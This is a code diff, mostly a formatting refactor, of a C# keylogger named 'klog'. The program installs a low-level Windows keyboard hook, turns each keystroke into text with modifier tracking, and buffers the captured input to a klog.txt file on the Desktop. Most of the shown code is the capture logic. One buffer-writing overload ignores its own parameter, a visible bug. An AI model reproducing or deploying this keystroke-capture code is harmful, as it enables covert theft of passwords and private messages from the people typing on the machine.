@@ -1,22 +1,25 @@
 ﻿using Windows.Win32;
-using Windows.Win32.UI.WindowsAndMessaging;
 using Windows.Win32.Foundation;
+using Windows.Win32.UI.WindowsAndMessaging;
 
 namespace klog;
 
 #pragma warning disable CA1416
 public static class Program
 {
-    private static readonly string PathToFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
-    private static readonly List<string> Buffer = new();
-    private static UnhookWindowsHookExSafeHandle? _kbHook;
-    private static StreamWriter _writer = new(PathToFile);
     private const uint BufferSize = 10;
-    private static bool _capsLockActive;
-    private static bool _shiftActive;
     private const int KEYDOWN = 0x0100;
     private const int KEYUP = 0x0101;
     private const int SYSKEYDOWN = 0x0104;
+
+    private static readonly string PathToFile =
+        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
+
+    private static readonly List<string> Buffer = new();
+    private static UnhookWindowsHookExSafeHandle? _kbHook;
+    private static StreamWriter _writer = new(PathToFile);
+    private static bool _capsLockActive;
+    private static bool _shiftActive;
 
     public static unsafe void Main()
     {
@@ -25,7 +28,7 @@ public static class Program
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
             WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
-        
+
         // set up message queue
         MSG msg = new();
         while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
@@ -33,7 +36,7 @@ public static class Program
             PInvoke.TranslateMessage(msg);
             PInvoke.DispatchMessage(msg);
         }
-        
+
         // clean disposable things up
         _kbHook.Close();
         _writer.Flush();
@@ -42,29 +45,23 @@ public static class Program
 
     private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
     {
-        var kbStruct = (KBDLLHOOKSTRUCT*) lParam.Value.ToPointer();
-        
+        var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();
+
         // checking for events other than keydown
         // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
         if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
             return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
 
         var stringToWrite = "";
-        
+
         // check for keydown
-        if (wParam == KEYDOWN || wParam == SYSKEYDOWN)
-        {
-            stringToWrite = HandleKeyDown(kbStruct);
-        }
-                
+        if (wParam == KEYDOWN || wParam == SYSKEYDOWN) stringToWrite = HandleKeyDown(kbStruct);
+
         // handle keyup events as it is important with shift, alt and control
-        if (wParam == KEYUP)
-        {
-            stringToWrite = HandleKeyUp(kbStruct);
-        }
-        
+        if (wParam == KEYUP) stringToWrite = HandleKeyUp(kbStruct);
+
         WriteToFile(stringToWrite);
-        
+
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
 
@@ -246,16 +243,10 @@ public static class Program
             0xB7 => "\n[START APPLICATION 2] ",
             _ => $"[CODE {kbStruct->vkCode.ToString()}]"
         };
-        
+
         // if caps lock or shift were pressed, negate caps lock active variable 
-        if (kbStruct->vkCode == 0x14)
-        {
-            _capsLockActive = !_capsLockActive;
-        }
-        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1)
-        {
-            _shiftActive = !_shiftActive;
-        }
+        if (kbStruct->vkCode == 0x14) _capsLockActive = !_capsLockActive;
+        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = !_shiftActive;
 
         return stringToWrite;
     }
@@ -272,24 +263,20 @@ public static class Program
             0xA5 => " [RIGHT ALT UP] ",
             _ => ""
         };
-            
-        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1)
-        {
-            _shiftActive = !_shiftActive;
-        }
+
+        if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = !_shiftActive;
 
         return stringToWrite;
     }
 
     /// <summary>
-    /// Adds a string to the <see cref="Buffer"/> and writes the <see cref="Buffer"/> to file if
-    /// <see cref="BufferSize"/> has been reached.
+    ///     Adds a string to the <see cref="Buffer" /> and writes the <see cref="Buffer" /> to file if
+    ///     <see cref="BufferSize" /> has been reached.
     /// </summary>
     /// <param name="stringToWrite">String to add to buffer</param>
     private static async void WriteToFile(string stringToWrite)
     {
         if (Buffer.Count >= BufferSize)
-        {
             try
             {
                 await WriteBuffer();
@@ -309,28 +296,22 @@ public static class Program
                 var tempBuffer = Buffer;
                 await Task.Delay(1000).ContinueWith(_ => WriteBuffer(tempBuffer));
             }
-        }
+
         Buffer.Add(stringToWrite);
     }
 
     /// <summary>
-    /// Writes buffer to file using the <see cref="_writer">_writer object</see>
+    ///     Writes buffer to file using the <see cref="_writer">_writer object</see>
     /// </summary>
     private static async Task WriteBuffer()
     {
-        foreach (var str in Buffer)
-        {
-            await _writer.WriteAsync(str);
-        }
+        foreach (var str in Buffer) await _writer.WriteAsync(str);
         Buffer.Clear();
     }
 
     private static async Task WriteBuffer(ICollection<string> buffer)
     {
-        foreach (var str in Buffer)
-        {
-            await _writer.WriteAsync(str);
-        }
+        foreach (var str in Buffer) await _writer.WriteAsync(str);
 
         buffer.Clear();
     }
